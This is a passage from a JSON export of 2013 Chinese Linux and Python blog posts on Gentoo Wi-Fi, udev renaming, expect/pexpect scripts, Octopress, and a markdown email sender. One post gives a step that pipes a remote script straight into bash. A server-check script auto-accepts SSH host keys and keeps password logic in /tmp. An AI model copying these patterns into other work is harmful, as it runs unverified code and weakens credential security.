    "content": "####*前言*\n\n公司全部使用了无线网络，我也被‘逼’的开始研究gentoo的无线上网，看了网上很多文章，以及gentoo文档，但是感觉都让我很迷糊，以下是我使用wpa_supplicant是一些总结\n\n####总结\n\n* 查看本机的无线网卡\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\nemerge pciutils #这样就有了lspci这个命令\nlocalhost ~ # lspci |grep -i wire\n02:00.0 Network controller: Atheros Communications Inc. AR9285 Wireless Network Adapter (PCI-Express) (rev 01)\n</pre></figure></notextile></div>\n\n可以发现，网卡是Atheros的AR9285\n\n* 安装wpa_supplicant\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\nemerge -s wpa_supplicant\n</pre></figure></notextile></div>\n\n* 生成一个配置配置文件\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\nzcat /usr/share/doc/wpa_supplicant-2.0/wpa_supplicant.conf.bz2 > /etc/wpa_supplicant/wpa_supplicant.conf\n</pre></figure></notextile></div>\n\n* 配置，以下是我去掉注释行，空白行等剩下的配置，其中的psk的字符串这样生成：\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\nlocalhost ~ # wpa_passphrase 我的ssid 我的key\nnetwork={\n\tssid=\"我的ssid\"\n\t#psk=\"我的key\"\n\tpsk=e596aa911775ed47e04f5b9a9540978203210874eb258208b87cf82b5cf72588\n}\n</pre></figure></notextile></div>\n\n把这段加在配置文件中\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\nlocalhost ~ # cat /etc/wpa_supplicant.conf \n\nctrl_interface=/var/run/wpa_supplicant\neapol_version=1\nap_scan=1\nfast_reauth=1\nnetwork={\n\tssid=\"我的ssid\"\n\tpsk=e596aa911775ed47e04f5b9a9540978203210874eb258208b87cf82b5cf72588\n\tpriority=2\n}\n</pre></figure></notextile></div>\n\n* 命令行启动wpa(如果想看详细的信息用于调试，加-d选项)\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\nlocalhost ~ # wpa_supplicant -i wlan0 -c /etc/wpa_supplicant/wpa_supplicant.conf   \nSuccessfully initialized wpa_supplicant\nwlan0: Trying to associate with 20:dc:c6:61:ab:34 (SSID='我的ssid' freq=2437 MHz)\nioctl[SIOCSIWFREQ]: Device or resource busy\nwlan0: Association request to the driver failed\nwlan0: Associated with 20:dc:c6:61:ab:34\nwlan0: WPA: Key negotiation completed with 20:dc:c6:61:ab:34 [PTK=CCMP GTK=CCMP]\nwlan0: CTRL-EVENT-CONNECTED - Connection to 20:dc:c6:61:ab:34 completed [id=0 id_str=]\n</pre></figure></notextile></div>\n\n其中wlan0: Association request to the driver failed 没关系\n\n* 安装udhcpc\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\nemerge udhcpc\n</pre></figure></notextile></div>\n\n* 通过dhcp自动获得\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\nlocalhost ~ # dhcpcd wlan0\ndhcpcd[12395]: version 5.6.4 starting\ndhcpcd[12395]: wlan0: waiting for carrier\ndhcpcd[12395]: wlan0: carrier acquired\ndhcpcd[12395]: wlan0: carrier lost\ndhcpcd[12395]: wlan0: waiting for carrier\ndhcpcd[12395]: wlan0: carrier acquired\ndhcpcd[12395]: wlan0: sending IPv6 Router Solicitation\ndhcpcd[12395]: wlan0: sendmsg: Cannot assign requested address\ndhcpcd[12395]: wlan0: rebinding lease of 192.168.0.106\ndhcpcd[12395]: wlan0: acknowledged 192.168.0.106 from 192.168.0.1 `�'\ndhcpcd[12395]: wlan0: checking for 192.168.0.106\ndhcpcd[12395]: wlan0: sending IPv6 Router Solicitation\ndhcpcd[12395]: wlan0: leased 192.168.0.106 for 7200 seconds\ndhcpcd[12462]: wlan0: wlan0: MTU set to 576\ndhcpcd[12395]: forked to background, child pid 12479\n</pre></figure></notextile></div>\n\n看到了吧 获得了192.168.0.106这个地址\n\n\n",
    "date": {
      "year": "2013",
      "month": "March",
      "day": "31"
    }
  },
  {
    "id": 258,
    "title": "跨操作系统初始化安装工具(laptop)",
    "category": "shell",
    "tags": [
      "shell",
      "bash",
      "ubuntu",
      "opensuse",
      "gentoo",
      "初始化"
    ],
    "url": "/archives/kua-cao-zuo-xi-tong-chu-shi-hua-an-zhuang-gong-ju-shell/",
    "content": "####前言\n\n上周看了[docopt](https://github.com/docopt/docopt), 感想很多。最近因为工作需要用opensuse，用ubuntu，个人pc用gentoo，\n实在够折腾，每个系统都要相应的安装那些软件，搭建环境。早就想好好整理下思路，更geek的做这件事情。上段时间还看了个\n[laptop](https://github.com/thoughtbot/laptop),觉得能力很一般，但是fork真不少。但是确实这个想法很不错，很有必要。\n然后周末就构思了我的[laptop](https://github.com/orzrd/laptop.git)\n\n####它的特性\n\n* 记录操作记录，当某处出现故障，下次会从这个位置继续执行，而不需要全部执行一遍\n* 受[docopt](https://github.com/docopt/docopt)启发，根据我特定的语法写配置文件，不需要修改初始化脚本initialize.sh\n* 只需要添加你要安装的软件包的安装命令（使用包管理器的就需要修改相应操作系统的install文件）\n* 支持对已安装软件的确认，不再安装而跳过\n* 根据特定语法打印安装过程的提示\n* 提供绿色，红色的asciilinux终端显示字体\n* 执行在没有git等环境下git clone项目安装\n\n####目前每个版本会安装那些软件？\n\n* gcc|g++|automake\n* tmux|htop|dstat\n* ruby|python|python库|expect\n* zsh|oh-my-zsh\n* easy_install|pip\n* django|torando|flask\n* nginx|uwsgi\n* redis|mongodb\n* mit-scheme|commonlisp\n* emacs\n* gitflow\n* celery\n* colout\n* MySQLdb|pymongo\n* taglist\n* gevent|twisted\n* the_silver_searcher\n* 检查vim是否自带python/ruby支持，否则下载编译一个执行的版本\n* 我的常用脚本[mytools](https://github.com/orzrd/mytools.github),目前包含一个expect脚本和orzdba\n* 我的[dotfiles](https://github.com/dongweiming/dotfiles.git)\n\ngentoo系统一些软件\n-----------------\n\n* gentoolkit|module-rebuild|genlop|eix|euses|elogv\n* fcitx\n* iproute2|netkit-telnetd\n\n####使用方法\n\n1. 有git的情况：\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_bash\">\nshell>git clone https://github.com/orzrd/laptop\nshell>cd laptop\nshell>bash initialize.sh\n</pre></figure></notextile></div>\n\n2. 没有git的情况：\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_bash\">\nshell>bash <(curl -s https://raw.github.com/orzrd/laptop/master/setup_laptop)\n</pre></figure></notextile></div> \n\n#####脚本语法\n\n可操作文件\n-------\n\n1. common.install: 用户自定义的软件安装脚本，推荐非操作系统包管理器的都放在这里，注意逻辑顺序\n2. opensuse/ubuntu/gentoo.install: 相应系统的安装脚本，这个只需要修改，我的脚本会自动根据系统信息找到\n3. initialize.sh： 假如你想把需要我的安装方法，添加功能等，修改他，他是主入口\n4. setup_laptop： 当用户没有git环境不能git clone  直接远程curl我，主要是下载git，clone我的laptop\n\n\n1. '#'  以'#'开头的行表示这个信息会被安装过程以绿色字体打印，提示一下你要安装的东西等\n2. ： 以':'开头的行，表示后面的字符串是个命令，也就是检查这个软件包有没有被安装需要的，假如which找到了路径说明被安装\n3. ; 以';'开头的行为注释\n4. 其它行就是要执行的语句，请不要当作shell注释等，因为他会把你写的东西当成要执行的命令\n\nTODO\n---\n\n* 文件下载后就不需要再下载而直接使用\n* 在执行某软件的安装过程中其他进程继续下载其他软件包（也就是实现shell版本的emerge）\n* 进度条或者python_koans的提示已完成/剩余，更多的异常处理等\n* 更多的异常处理\n* 打印彩色字体内容嵌其他颜色字体（比如提示出错，高亮错误的原因或者软件包）\n\n注意我的项目地址，欢迎各种fork，pull request，issue\n---\n\n###https://github.com/orzrd/laptop\n\n\n",
    "date": {
      "year": "2013",
      "month": "April",
      "day": "08"
    }
  },
  {
    "id": 259,
    "title": "关于expect研究(四)",
    "category": "expect",
    "tags": [
      "expect"
    ],
    "url": "/archives/guan-yu-expectyan-jiu-si/",
    "content": "前言\n=======\n\n最近又开始开始了expect的一些更深层次的东西，分享出来\n\n字典\n----\n\nexpect没有严格意义的字典，但是确实可以使用\n\n创建字典:\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\nset mydict [dict create tbj tbjpass server serverpass]\n它表示创建一个字典叫做mydict，包含2个kv对：tbj & tbjpass 和server & serverpass\n</pre></figure></notextile></div>\n\n你也可以这样添加数据:\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\nset mydict .dongwm dongwmpass \n 表示添加一个键为.dongwm 值为dongwmpass的新数据到mydict\n</pre></figure></notextile></div>\n\n根据key获取值可以这样:\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\n[dict get $mydict server]\n表示从mydict获取server的值\n</pre></figure></notextile></div>\n\nNB的事，可以直接这样写，看我的片段:\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\nexpect \"password:\"\nsend \"[dict get $mydict s70]\\n\"\n也就是直接把这个看起来像列表的东东直接写到字符串里面\n</pre></figure></notextile></div>\n\n判断变量是否存在\n--------------\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\nif {[info exists serverpass]!=1} {\n    puts 'sd'\n}\n表示如果serverpass这个变量要是不存在，就puts，但是注意的是，\n假如上面你已经set 这个变量，不管有没有值，这个变量都已经被*定义*了\n</pre></figure></notextile></div>\n\n判断列表包含\n-----------\n\n一种使用switch结构，还有一种是if方式，将属于一类的放在一个列表，\n看它是不是'in':\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\nset listserver \"1 2 3 4 \"\nif {1 in $listserver} {puts 11}\n当1在列表$listserver里面puts\n</pre></figure></notextile></div>\n\nswitch多条件\n----------\n\n 假如有一些switch的结果，但是他们有一些需要做一样的操作，\n 那么就可以吧他们放在一起\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\nswitch $port {\n    100  -\n    200  { puts 1}\n    300  -\n    400 {puts 2}\n    }\n这里表示当port是100,或者200会puts1,当port是300或者400，会puts2\n</pre></figure></notextile></div>\n\n\n",
    "date": {
      "year": "2013",
      "month": "April",
      "day": "11"
    }
  },
  {
    "id": 260,
    "title": "多台服务器进程查看脚本(pexpect+yaml)",
    "category": "expect",
    "tags": [
      "expect",
      "yaml"
    ],
    "url": "/archives/duo-tai-fu-wu-qi-jin-cheng-cha-kan-jiao-ben-pexpect-plus-yaml/",
    "content": "####前言\n\n最近做自己开发用相关服务的一个checklist，就写了这个脚本，用来在跳板机去检查各个服务器上面的相关服务是否正常\n\n####思路\n\n使用expect登录每个机器(因为安全问题，不能直接使用ssh信任),然后根据yaml文件的配置读取服务名字以及启动的进程数量\n去检查每个服务是否正常\nPS：难点是没有用端口转发也只有普通用户权限\n\n####checklist.py\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\n#coding=utf-8\nimport sys\n#因为我这个脚本要让很多人能运行，但是不能给他们看见我的密码算法,所以是pyc\n#我这个脚本要给很多其他普通用户去用，是用我的ssh登录操作，不能放在我的home目录，所以放在tmp\nsys.path.append('/tmp/local/lib/python2.6/site-packages/PyYAML-3.10-py2.6-linux-x86_64.egg') #依赖yaml\nsys.path.append('/tmp/local/lib/python2.6/site-packages/pexpect-2.4-py2.6.egg') #依赖pexpect\nimport yaml\nimport pexpect\ndataDict = yaml.load(open('/tmp/config.yaml')) #将我的yaml配置load进来\n\ndef myprint(color,mes): #以前写的一个终端彩色打印的函数\n    '''使用ANSI控制码终端显示彩色'''\n    d = dict(r=31, g=32, gb=36, y=33, b=34, p=35, o=37)\n    color = \"\\x1B[%d;%dm\" % (1, d[color])\n    print \"%s%s\\x1B[0m\" % (color, mes)\n\ndef main():\n    list = ['g', 'b', 'y', 'gb', 'p']\n    light = 0\n    for k in dataDict:\n        if k.startswith('bj-'):\n        color = list[light%5] #根据服务器对颜色轮循\n            SERVER = dataDict[k]\n        #我这是使用了-F 是因为我没有root权限不能修改hosts文件，但是我在config.yaml使用了别名，\n        而这个定义就是自定义了sshconfig，默认是~/.ssh/config\n        child = pexpect.spawn('ssh -F /tmp/sshconfig dongwm@{0}'.format(SERVER['host']))\n        #因为有其他用户，可能他还没有链接过某服务器，最开始会让你确认服务器标识，需要点yes\n        f = child.expect(['Password: ', 'password: ', 'continue connecting (yes/no)?'])\n        if f == 2:\n            #当这个flag为2  表示那个用户没有登录过某服务器\n            child.sendline('yes')\n            child.expect('password:')\n            child.sendline('{0}'.format(mypasswd(SERVER['host']))) #mypasswd是加密我服务器权限的函数，每个服务器密码不同\n        if f == 1:\n            child.sendline('{0}'.format(mypasswd(SERVER['host'])))\n        child.expect('~')\n        for service in SERVER['service']:\n        flag = 0\n        #我在配置里面会加服务,一般会指定服务的进程数来对比是否正常\n        if isinstance(service, dict):\n            data =service.items()[0]\n            service = data[0]\n            num = data[1]\n        else:\n        #假如我在配置只指定服务，不指定进程数，那么只要确定跑了进程 不在乎进程数\n            num = 0\n            flag = 1\n            child.expect('~')\n            child.sendline('ps -ef|grep {0}|grep -v grep|wc -l'.format(\n            service))\n            child.readline()\n            #进程数\n            pro_num = child.readline().split('\\r\\n')[0]\n        if int(pro_num) == num or flag:\n            #进程数符合配置标注的数值\n            myprint(color, '[{0}]  [{1}]  [{2}]  [{3}]'.format(k.center(12), \n            SERVER['ip'].center(14), service.center(20), 'ok'.center(4)))\n        else:\n            myprint('r', '[{0}]  [{1}]  [{2}]  [{3}]  [{4}!={5}]'.format(k.center(12), \n            SERVER['ip'].center(14), service.center(20), 'fail', \n            pro_num, num))\n        light += 1\n            child.sendline('exit')\n\nif __name__ == '__main__':\n    main()\n</pre></figure></notextile></div>\n\n####config.yaml 我这里只截取了其中一段\n\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_bash\">\nbj-2:\n  host: s233 #这个s233在sshconfig指定\n  ip: XXX.XXX.XXX.233 #只是为了显示出ip 好确认\n  service: #服务load后是一个列表\n  #给XX用\n  - nginx: 5\n  - uwsgi: 25\n  - supervisord: 1\n  #给本机XX提供mysql服务\n  - mysql: 3 #django\n  #给本机XX提供XX\n  - celery: 12 \n  #给本机XX提供XX\n  - rabbitmq: 9\n  - redis: 1\n  - mongod: 2\n</pre></figure></notextile></div>\n\n",
    "date": {
      "year": "2013",
      "month": "April",
      "day": "19"
    }
  },
  {
    "id": 261,
    "title": "octopress自定义markdown的code语法",
    "category": "octopress",
    "tags": [
      "pygments_code.rb",
      "markdown"
    ],
    "url": "/archives/octopresszi-ding-yi-markdownde-codeyu-fa/",
    "content": "####前言\n\noctopress自带的markdown语法高亮代码，最后展示在页面上的效果比较不友好-不能复制粘贴代码，不高亮，还有很丑的行数提示。\n我一直使[SHJS](shjs.sourceforge.net),还算比较喜欢，但是以前每次都是编辑markdown文章，在使用\n\n```python\n```XX```\n```\n\n的时候，使用\n\n```python\n<div class=\"bogus-wrapper\"><notextile><figure class=\"code\"><pre class=\"sh_python\">\nXXX\n</pre></figure></notextile></div>\n```\n\n这样的苦逼方式，最近实在是不了了，自定义octopress的解析过程\n\n其实就是修改plugins/pygments_code.rb\n\n```python\nrequire 'pygments'\nrequire 'fileutils'\nrequire 'digest/md5'\n\nPYGMENTS_CACHE_DIR = File.expand_path('../../.pygments-cache', __FILE__)\nFileUtils.mkdir_p(PYGMENTS_CACHE_DIR)\n\nmodule HighlightCode\n  def highlight(str, lang)\n    lang = 'ruby' if lang == 'ru'\n    lang = 'objc' if lang == 'm'\n    lang = 'perl' if lang == 'pl'\n    lang = 'yaml' if lang == 'yml'\n    str = pygments(str, lang).match(/<pre>(.+)<\\/pre>/m)[1].to_s.gsub(/ *$/, '') #strip out divs <div class=\"highlight\">\n    tableize_code(str, lang)\n  end\n\n  def pygments(code, lang)\n    if defined?(PYGMENTS_CACHE_DIR)\n      path = File.join(PYGMENTS_CACHE_DIR, \"#{lang}-#{Digest::MD5.hexdigest(code)}.html\")\n      if File.exist?(path)\n        highlighted_code = File.read(path)\n      else\n        highlighted_code = Pygments.highlight(code, :lexer => lang, :formatter => 'html', :options => {:encoding => 'utf-8'})\n        File.open(path, 'w') {|f| f.print(highlighted_code) }\n      end\n    else\n      highlighted_code = Pygments.highlight(code, :lexer => lang, :formatter => 'html', :options => {:encoding => 'utf-8'})\n    end\n    highlighted_code\n  end\n  def tableize_code (str, lang = 'python') #主要是修改这个方法\n    table = \"<pre class='sh_#{lang}'>\"\n    str.lines.each_with_index do |line,index|\n      table += \"<span class='line'>#{line}</span>\"\n    end\n    table += \"</pre>\"\n  end\nend\n```\n\n####使用方法\n\n和过去一样，在md的文章中使用:\n\n```python\n```XX```\n```\n\n要是想指定某语言，需要先引用这个css，然后在md中\n比如这里用bash语法（也是我的默认）\n\n```\n```bash\nXX\n\\``` # 这里不能正常显示，加个反斜杠\n```\n",
    "date": {
      "year": "2013",
      "month": "April",
      "day": "27"
    }
  },
  {
    "id": 262,
    "title": "udev升级的网卡重命名问题和解决",
    "category": "gentoo",
    "tags": [
      "udev"
    ],
    "url": "/archives/udevsheng-ji-de-wang-qia-zhong-ming-ming-wen-ti-he-jie-jue/",
    "content": "####故障描述\n\n最近终于更新了下gentoo，重启发现我的eth0网卡启动失败：\n\n```\n * Bringing up interface eth0\n *   ERROR: interface eth0 does not exist\n *   Ensure that you have loaded the correct kernel module for your hardware\n * ERROR: net.eth0 failed to start\n```\n而启动某些我常用的服务，比如mongodb，也报错：\n\n```\n~ # /etc/init.d/mongodb restart\n * Bringing up interface eth0\n *   ERROR: interface eth0 does not exist\n *   Ensure that you have loaded the correct kernel module for your hardware\n * ERROR: net.eth0 failed to start\n * ERROR: cannot start mongodb as net.eth0 would not start\n```\n\n竟然也需要启动网卡？\n\n######查看内核和dmesg：\n\n查看内核模块已经选中，而且以前eth0也有，再看dmesg\n\n```\ndmesg |grep network \n[   74.261872] systemd-udevd[14259]: renamed network interface wlan0 to wlp2s0\n[   74.391865] systemd-udevd[14259]: renamed network interface eth0 to enp0s4\n\n```\n\n原来被重命名了\n\n####为什么？\n\n从udev-197将自动分配更好的接口名字，具体解释请看[PredictableNetworkInterfaceNames]\n(http://www.freedesktop.org/wiki/Software/systemd/PredictableNetworkInterfaceNames),\n\n####解决办法，有三种\n\n1. 临时办法，重启还是会失效\n\nifrename -i enp0s4 -n eth0 #修改网卡名字变成原来的eth0\n\n2. 使用新的名字\n\n```\nrm /etc/init.d/net.eth0 #删除不存在的引用\n\nlocalhost ~ # rc-update delete net.eth0 default #删除不存在的开机启动\n * service net.eth0 removed from runlevel default\nlocalhost ~ # rc-update add net.enp0s4 default #使用新名字\n```\n\n3. 重置udev的rules，还是用原来的方法\n\n```\nln -s /dev/null /etc/udev/rules.d/80-net-name-slot.rules\n```\n\n第二种，和第三种需要重启\n\n####启动应用为什么也需要启动应该启动的网卡\n\n查看/etc/init.d/mongodb脚本，发现是因为depend，一般的初始化脚本结构是\n\n```\n#!/sbin/runscript\n\ndepend() {\n  （依赖关系信息）\n}\n\nstart() {\n  （启动服务所必需的命令）\n}\n\nstop() {\n  （停止服务所必需的命令）\n}\n\nrestart() {\n  （重启服务所必需的命令）\n}\n```\n比如 mongodb 的依赖是\n\n```\ndepend() {\n  need net #需要依赖net.X\n}\n```\n\n下次我专门研究一篇gentoo初始化脚本的文章\n",
    "date": {
      "year": "2013",
      "month": "April",
      "day": "27"
    }
  },
  {
    "id": 263,
    "title": "使用docopt/schema:markdown文件直接发送支持python语法的邮件",
    "category": "python",
    "tags": [
      "markdown",
      "docopt",
      "schema",
      "requests",
      "pygments",
      "pyyaml"
    ],
    "url": "/archives/shi-yong-docopt-slash-schema-markdownwen-jian-zhi-jie-fa-song-you-jian/",
    "content": "前言\n----\n\n1. 工作经常写一些东西发邮件，但是渐渐的已经用markdown写东西，每次很纠结，\n1. 而且还需要我打开邮箱，然后balabala，比如我还要在后面加入公司和自己的一些信息\n1. 经常邮件或者html都带有python的源码段，想要一个支持python语法的css显示效果\n\n\n使用的模块\n---------\n\n* [docopt](https://github.com/docopt/docopt)  Pythonic的命令行函数解析，只需要把显示的参数列表放在__doc__\n* [schema](https://github.com/halst/schema) Pythonic的数据结构验证，不需要那么多的异常处理\n* [markdown](https://pypi.python.org/pypi/Markdown/2.3.1) \n* [PyYAML](https://pypi.python.org/pypi/PyYAML/3.10)  解析yaml文件\n* [pygments](https://pypi.python.org/pypi/Pygments/1.6) 借用它对python语法的一些正则匹配\n* [requests](https://github.com/kennethreitz/requests) 我没有自己实现css，css可以本地自己自定义，也可以从网站下载，这里去爬网站的css文件\n\nPS:安装这些可以 \n\n```\nsudo easy_install schema docopt markdown pygments pyyaml\n```\n\n功能\n----\n\n* 支持python语法\n* 支持本地有配置文件，不需要命令行balabala那么多(使用yaml)\n* 支持多种颜色方案，方案可选项: pygments-css\n* 支持本地自定义css(默认去这个网站爬回来)\n* 支持中文\n* 支持自定义html模板文件，比如我们公司邮件下部的联系方式等说明，可以放在模板邮件里面\n* 可以不发送邮件，只保留和加了css后的html到本地文件\n\n使用举例\n----\n\n1. 默认模式\n\n```python\npython MarkPygments.py  --mailto mailto@qq.com,mailto2@qq.com  -s 标题 --mailserver smtp.exmail.qq.com -u youremailname \n-p yourpassword   --cc cc@qq.com whatever.md --template template.html\n```\n\n1. 使用本地yaml配置，配置如下, 配置中没有能命令行选项找，配置和终端都有会使用中有文件配置\n这是yaml文件的内容：\n\n```python\nmarkemail:\n    --theme: autumn\n    --username: XX \n    --password: YY\n    --mailserver: smtp.exmail.qq.com\n    --mailto: to1@qq.com,to2@qq.com\n    --subject: '周报'\n```\n\n然后这样使用：\n\n```python\npython MarkPygments.py --config ~/.config.yaml whatever.md --template template.html\n```\n\n1. 使用本地css目录下的css， 不发送邮件只保存html到本地文件\n\n```python\npython MarkPygments.py --config ~/.config.yaml whatever.md --template template.html \n-o out.html --local pygments-css\n```\n\n这里是代码，或者你可以去看[MarkPygments.py](https://github.com/orzrd/mytools/blob/master/MarkPygments.py)\n\n```python\n# coding=utf-8\n'''\nUsage:\nMarkPygments.py [options] MDFILE\nMarkPygments.py [options] --local <cssdir> MDFILE\nMarkPygments.py [options] --config <yamlfile> MDFILE\n\nArguments:\nMDFILE the markdown file\n-u --username user your email name\n-p --password pass your email login password\n-mt --mailto tolist mailto list\n--theme theme css style for python syntax [default: monokai]\n-s --subject subject email's subject\n--mailserver server mail server [default: smtp.exmail.qq.com]\n\nOptions:\n-h --help show this help message and exit\n--version show version and exit\n--config yamlfile config yaml file path (e.g. .config.yaml)\n--local cssdir use local custom css dir\n-o --output [outhtml] make output to html file\n-c --cc list cc list\n--template html template html\n\n'''\n\n\nimport os\nimport re\nimport codecs\nimport smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\nimport markdown\nfrom docopt import docopt\nfrom schema import Schema, And, Or, Use, SchemaError\n\n\ndef log(message, error=False):\n    '''终端输出log'''\n    color = 31 if error else 32\n    print '\\x1B[1;{0}m * {1}\\x1B[0m'.format(color, message)\n\n\ndef regex():\n    '''借用pygments对python语法的实现以及自己实现的正则'''\n    from pygments.lexers import PythonLexer\n    dict = {}\n    lex = PythonLexer()\n    token = lex.tokens\n    l = ['keywords', 'builtins']\n    for i in l:\n        dict[i[:2]] = token[i][0][0]\n    dict['fu'] = '.*(def)\\W+(.*)\\((.*)\\)'\n    dict['cl'] = '.*(?!<span)(class)(?!=)\\W+(?!=)(.*)\\((.*)\\)'\n    dict['fm'] = '.*(from)\\W+(.*)\\W+(import)\\W+(.*)'\n    dict['im'] = '.*(import)\\W\\{,\\4}(.*)'\n    return dict\n\n\ndef sendMail(mailserver, username, password, tolist, subject, msg, cc=[]):\n    '''发送邮件'''\n    def makeEmail(content):\n\n        msg = MIMEMultipart()\n        msg['Subject'] = subject\n        msg['From'] = username\n        msg['To'] = ','.join(tolist)\n        if cc:\n            msg['Cc'] = ','.join(cc)\n        html_part = MIMEText(content, 'html', 'utf-8')\n        msg.attach(html_part)\n        return msg\n    try:\n\n        smtp = smtplib.SMTP()\n        log('Connect to {0}'.format(mailserver))\n        smtp.connect(mailserver, 25)\n        smtp.login(username, password)\n        log('Login Success with {0}'.format(username))\n        log('To send this Email...')\n        if cc:\n            smtp.sendmail(username, tolist + cc, makeEmail(msg).as_string())\n        else:\n            smtp.sendmail(username, tolist, makeEmail(msg).as_string())\n        log('Send Success')\n    except Exception, e:\n        log(e, error=True)\n\n\ndef paserYaml(yamlfile):\n    '''解析yaml文件配置'''\n    import yaml\n    return yaml.load(open(yamlfile)).get('markemail', {})\n\n\ndef check_email(emails):\n    '''检查选项是否是邮件格式'''\n    print emails\n    regex = r'''^[_a-z0-9-]+(\\.[a-z0-9-]+)*@[a-z0-9-]+\n(\\.[a-z0-9-]+)*(\\.[a-z]{2,3})$'''\n    rst = map(lambda n: True if re.compile(\n        regex).match(n) else False, emails.split(','))\n    return True if False not in rst else False\n\n\ndef colorClass():\n    '''pygments-css对语法的class对应字典'''\n    return dict(\n        cl=['k', 'nc', 'nb'],\n        fu=['k', 'nf', 'bp'],\n        fm=['nd', 'vi', 'nd', 'vi'],\n        im=['nd', 'mi'],\n        ke=['kd'],\n        bu=['vc']\n    )\n\n\nclass cssStyle(object):\n\n    '''获取css设置'''\n    def __init__(self, style, *args):\n\n        self.style = style\n        self.args = args\n\n    def fusionCss(self, csshtml):\n\n        css = '<style type=\"text/css\">'\n        css += '.codehilite {border: 2px solid rgb(225, 225, 225)}'\n        css += csshtml\n        css += '</style>'\n        return css\n\n    def local(self, cssdir, theme):\n        '''从本地css文件'''\n        log('Fetch css from local dir:{0}'.format(cssdir))\n        with open('{0}/{1}.css'.format(cssdir, theme)) as f:\n            css = f.read().strip()\n        return self.fusionCss(css)\n\n    def crawler(self, theme):\n        '''去这个网站爬回来'''\n        import requests\n        log('Fetch css from site:igniteflow.com')\n        r = requests.get(\n            'http://igniteflow.com/static/css/pygments/{0}.css'.format(theme))\n        return self.fusionCss(r.text.strip())\n\n    def main(self):\n\n        return getattr(self, self.style)(*self.args)\n\n\nclass FabricHtml(object):\n\n    def __init__(self, md, css):\n\n        self.css = css\n        self.md_html = self.makeToHtml(md)\n\n    def makeToHtml(self, md):\n\n        log('Markdown converted into html')\n        input_file = codecs.open(md, mode=\"r\", encoding=\"utf-8\")\n        text = input_file.read()\n        return markdown.markdown(text)\n\n    def AddCssToHtml(self, html, css_html):\n        '''增加css的style'''\n        ohtml = css_html\n        c = html.split('```')\n        inc = 0\n        ohtml += c[0]\n        for inc in range(1, len(c[1:]) + 1):\n            if inc % 2:\n                ohtml += '<div class=\"codehilite\">'\n            else:\n                ohtml += '</div>'\n            ohtml += c[inc]\n            inc += 1\n        return ohtml\n\n    def makeSpan(self, html, c):\n        '''构造span包含符合的语法块'''\n        if not html:\n            return ''\n\n        return '<span class=\"{0}\">{1}</span>'.format(c, html)\n\n    def markHtml(self, h):\n        '''给html加python语法的颜色css'''\n        for k, v in regex().items():\n            args = colorClass()[k]\n            m = re.compile(r'%s' % v).match(h)\n            if m:\n                match = m.groups()\n                for i in range(len(args)):\n                    h = re.sub(match[i], self.makeSpan(\n                        match[i], args[i]), h, 1)\n        return h\n\n    def main(self, template=''):\n\n        has_css_html = self.AddCssToHtml(self.md_html, self.css)\n        return self.pygments(has_css_html) + template\n\n    def pygments(self, html):\n\n        log('Mark span label with python syntax')\n        ohtml = ''\n        for h in html.split('\\n'):\n            ohtml += self.markHtml(h)\n            ohtml += '\\n'\n        return ohtml\n\n\ndef checkSchema(schemadict, args):\n    '''Pythonic的检查schema'''\n    schema = Schema(schemadict)\n    try:\n        args = schema.validate(args)\n    except SchemaError as e:\n        raise\n        exit(log(e, error=True))\n    return args\n\n\ndef main():\n\n    args = docopt(__doc__, version='1.0r1')\n\n    isLocal = args.get('--local')\n    hasConfig = args.get('--config')\n    theme = args.get('--theme')\n    if hasConfig:\n        checkSchema({\n            '--config': And(Use(str),\n                            os.path.exists,\n                            error='Invalid config format or not exists')\n        }, {'--config': hasConfig}\n        )\n        yamlConfig = paserYaml(hasConfig)\n        args.update(yamlConfig)\n    args.pop('--config')\n\n    if isLocal:\n        checkSchema({\n            '--local': And(Use(str), os.path.isdir,\n                           lambda n: os.path.exists('{0}/{1}.css'.format(\n                                                    n, theme)), error=\n                           'Invalid custom css dir or hasnot this theme'),\n        }, {'--local': isLocal}\n        )\n        css_dict = cssStyle('local', isLocal, theme).main()\n    else:\n        css_dict = cssStyle('crawler', theme).main()\n    args.pop('--local')\n    args.pop('--theme')\n    args = checkSchema({\n        'MDFILE': os.path.exists,\n        '--mailserver': Use(str, error='Invalid server format'),\n        '--mailto': And(Use(str), lambda n: check_email(n),\n                        error='Invalid email format'),\n        '--subject': Or(Use(str), Use(unicode),\n                        error='Invalid suject format'),\n        '--password': Use(str, error='Invalid suject format'),\n        '--cc': Or(None, And(Use(str), lambda n: check_email(n)),\n                   error='Invalid email format'),\n        '--output': Or(False, lambda n: os.path.exists(\n        os.path.dirname('{0}/{1}'.format(\n        os.path.abspath('.'), n))),\n            error='Dir must exists'),\n        '--template': Or(None, os.path.exists, error='template must exists'),\n        '--username': Use(check_email, error='Invalid username format'),\n        '--help': Or(False, True),\n        '--version': Or(False, True)\n    }, args)\n    do = FabricHtml(args['MDFILE'], css_dict)\n    cc = args['--cc'].split(',') if args['--cc'] else []\n\n    if args['--template']:\n        with 